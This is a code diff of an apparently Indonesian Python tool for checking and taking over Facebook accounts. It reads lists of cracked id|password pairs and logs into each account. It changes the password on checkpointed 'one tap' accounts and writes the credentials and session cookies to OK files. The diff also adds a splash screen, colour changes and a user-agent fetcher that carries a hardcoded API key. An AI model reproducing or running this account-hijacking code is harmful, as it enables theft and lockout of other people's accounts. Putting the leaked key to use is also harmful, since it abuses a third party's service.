@@ -273,6 +273,11 @@ def banner():
 [bold green]                 _/\_   |    /__ |__| | \|    _/\_ |__/ 
              """,width=90,padding=(0,8),title=f"LOGO",style=f"bold white"))
 #--------------------[ BAGIAN-MASUK ]--------------#
+def vevek():
+	cetak(panel(f" {P}[{H}+{P}]\33[1;96m Hallo Cuy Gw \33[1;92mXyzonXD \33[1;96mGw Di Sini Selaku Author Disini Untuk Menggunakan Script Ini Sebaik Mungkin Dan Jangan Di salah Gunakan Yakan Awokawokawok  Dan Jangan Di Buat Prem Ya Adik² Terimakasih \n {P}[{H}+{P}]\33[1;96m Thanks To All",width=90,padding=(0,2),style=f"bold white"))
+	waktu.tidur(10)
+	login()
+	
 def login123():
 	os.system('clear')
 	banner()
@@ -2354,48 +2359,48 @@ ubahP = []
 
 def file_cp():
 	dirs = os.listdir('CP')
-	print ("%s%s%s%s\033[0m\033[0mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(U,til,O,U,O))
+	print ("%s%s%s%s\33[1;96mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(U,til,O,U,O))
 	for file in dirs:
 		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
 	try:
-		print("\n%s%s%s\033[0mMasukan file [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
+		print("\n%s%s%s\33[1;96mMasukan file [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
 		opsi()
 	except IOError:
-		print ('%s%s\033[0mFile Tidak Ada'%(M,til))
+		print ('%s%s\33[1;91mFile Tidak Ada'%(M,til))
 		exit()
 
 def opsi():
 	CP = ("CP/")
-	romi = input("%s%s%s\033[0mNama file %s> %s"%(U,til,O,M,K))
+	romi = input("%s%s%s\33[1;96mNama file %s> %s"%(U,til,O,M,K))
 	if romi == "":
-		print(" [+] Isi Yang Benar "%(M,til));jeda(2)
+		print(" [+] \33[1;96mIsi Yang Benar ");jeda(2)
 		back()
 	try:
 		file_cp = open(CP+romi, "r").readlines()
 	except IOError:
-		exit("\n%s%s\033[0mNama File %s\033[0m Tidak Tersedia"%(M,til,romi))
-	jalan("%s%s%s\033[0mMode Pesawatkan Terlebih Dahulu 5 Detik "%(U,til,O))
-	pw=input("\n%s%s%s\033[0mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(U,til,O,M,K))
+		exit("\n%s%s\33[1;96mNama File %s\033[0m Tidak Tersedia"%(M,til,romi))
+	jalan("%s%s%s\33[1;96mMode Pesawatkan Terlebih Dahulu 5 Detik "%(U,til,O))
+	pw=input("\n%s%s%s\33[1;96mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(U,til,O,M,K))
 	if pw in['y','Y']:
 		ubah_pass.append("ubah_sandi")
-		pw2 = input("%s%s%s\033[0mMasukan Sandi %s> %s"%(U,til,O,M,K))
+		pw2 = input("%s%s%s\33[1;96mMasukan Sandi %s> %s"%(U,til,O,M,K))
 		if len(pw2) <= 5:
-			print("%s%s Sandi Minimal 6 Karakter "%(M,til))
+			print("%s%s\33[1;91mSandi Minimal 6 Karakter "%(M,til))
 		else:
 			pwbaru.append(pw2)
-	print ("%s%s%s\033[0mTotal Akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
+	print ("%s%s%s\33[1;96mTotal Akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
 	nomor = 0
 	for fb in file_cp:
 		akun = fb.replace("\n","")
 		ngecek  = akun.split("|")
 		nomor+=1
-		print("\n%s%s.%s\033[0mLogin Akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
+		print("\n%s%s.%s\33[1;96mLogin Akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
 		try:
 			mengecek(ngecek[0].replace("",""), ngecek[1])
 		except requests.exceptions.ConnectionError:
 			continue
-	print("\n%s%s%s\033[0mSelesai Mengecek Akun"%(U,til,O));jeda(0.07)
-	input('%s%s%s[%s Enter%s ]'%(U,til,O,U,O))
+	print("\n%s%s%s\33[1;96mSelesai Mengecek Akun"%(U,til,O));jeda(0.07)
+	input('%s%s%s[%s\33[1;96m Enter%s ]'%(U,til,O,U,O))
 	back()
 	
 data = {}
@@ -2415,9 +2420,9 @@ def mengecek(user,pw):
 	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
 	if "c_user" in session.cookies.get_dict():
 		if "Akun Anda Dikunci" in urlPost.text:
-			print("\r%s%s\033[0m Akun Terkunci Sesi New"%(M,til))
+			print("\r%s%s\33[1;96m Akun Terkunci Sesi New"%(M,til))
 		else:
-			print("\r%s%s\033[0m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,H))
+			print("\r%s%s\33[1;96m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,H))
 			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
 	elif "checkpoint" in session.cookies.get_dict():
 		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
@@ -2431,7 +2436,7 @@ def mengecek(user,pw):
 		response2=bs4.BeautifulSoup(an.text,"html.parser")
 		cek=[cek.text for cek in response2.find_all("option")]
 		number=0
-		print("\r%s [+] %s\033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
+		print("\r%s %s\33[1;96mterdapat %s%s%s \33[1;96mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
 		if(len(cek)==0):
 			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
 				if "ubah_sandi" in ubah_pass:
@@ -2450,29 +2455,48 @@ def mengecek(user,pw):
 						dat2.update({"password_new":"".join(pwbaru)})
 						an=session.post(url+link3.get("action"),data=dat2)
 						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
+						print("\r%s%s\33[1;96mAkun One Tab, Sandi Berhasil Di 🥳🥳 \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
 						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
-						#cek_apk(coki)
+						cek_apk(kuki)
 				else:
-					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda Login		"%(H,til))
+					print("\r%s%s \33[1;96mAkun One Tab, Silahkan Anda 🥳🥳		"%(H,til))
 					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
-					#cek_apk(coki)
+					cek_apk(kuki)
 			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
-				print("\r%s [+] \033[0mAkun Terpasang Autentikasi Dua Faktor			"%(M))
+				print("\r%s \33[1;91mAkun Terpasang Autentikasi Dua Faktor			"%(M))
 			else:
-				print("%s%s\033[0mTerjadi Kesalahan"%(M,til))
+				print("%s%s\33[1;91mTerjadi Kesalahan"%(M,til))
 		else:
 			if "c_user" in session.cookies.get_dict():
-				print("\r%s%s Akun Tidak Checkpoint, Silahkan Anda Login "%(H))
+				print("\r%s%s \33[1;96mSelamat Akun Anda Tidak Checkpoint Silahkan Masuk Lewat FB🥳🥳 "%(H))
 				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
 		for opsi in range(len(cek)):
 			number +=1
 			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
 	elif "login_error" in str(response):
 		oh = run.find("div",{"id":"login_error"}).find("div").text
-		print("%s [+] %s"%(M,oh))
+		print("%s \33[1;96m %s"%(M,oh))
 	else:
-		print("%s [+] \033[0mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
+		print("%s [+] \33[1;91mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
+		  
+def scarpping_ua():
+    # Url & Headers website #
+    
+    
+    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
+    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
+    
+    # Main menu #
+    
+  #  os.system('clear')
+    try:
+        response = requests.get(url,headers=header)
+        if response.status_code == 200:
+            uascrap.append(response.json()['ua'])
+        else:
+            uascrap.append("Mozilla/5.0 (Linux; Android 11; BrayennnFB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
+    except requests.exceptions.ConnectionError:
+        uascrap.append("Mozilla/5.0 (Linux; Android 11; BrayennnFB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
 		  
 #-----------------------[ DEFF SCRAPT METODE ]--------------------#
 from bs4 import BeautifulSoup as bs
@@ -2500,19 +2524,19 @@ def akhir():
     try:
         Menit = str(Total_Waktu).split(':')[1]
         Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
-        print('\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
+        print('\n {P}[{H}+{P}]\33[1;96m Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
     except Exception as e:
-        print('\n\n [+] Program Selesai Dalam Waktu 0 Detik\n')
+        print('\n\n {P}[{H}+{P}]\33[1;96m Program Selesai Dalam Waktu 0 Detik\n')
 
 class get_data_web:
     
     def __init__(self):
         self.xyz = requests.Session()
-        url = input(' [+] Masukkan URL : ')
-        print('\n [1] Source Payload')
-        print(' [2] Parsed Payload')
-        print(' [3] Source Code Post Requests')
-        self.tanya = input(' [+] Pilih : ')
+        url = input(' {P}[{H}+{P}]\33[1;96m Masukkan URL : ')
+        print('\n {P}[{H}+{P}]\33[1;96m Source Payload')
+        print(' {P}[{H}+{P}]\33[1;96m Parsed Payload')
+        print(' {P}[{H}+{P}]\33[1;96m Source Code Post Requests')
+        self.tanya = input(' {P}[{H}+{P}]\33[1;96m Pilih : {P}')
         self.domain = url.split('/')[2]
         self.get_form(url)
        
@@ -2523,7 +2547,7 @@ class get_data_web:
             if self.tanya in ['1','01','a']: self.printing1(req,x)
             elif self.tanya in ['2','02','b']: self.printing2(req,x)
             elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
-            else: exit('\n [+] Isi Yang Benar Asu')
+            else: exit('\n {P}[{H}+{P}]\33[1;91m Isi Yang Benar Asu')
 
     def get_head1(self,req):
         data = {}
@@ -2625,6 +2649,7 @@ class get_data_web:
         print("next = '%s'"%(post))
         print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
 
+
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
 if __name__=='__main__':
 	try:os.system('git pull')
@@ -2639,4 +2664,4 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('clear')
 	except:pass
-	login()
+	vevek()
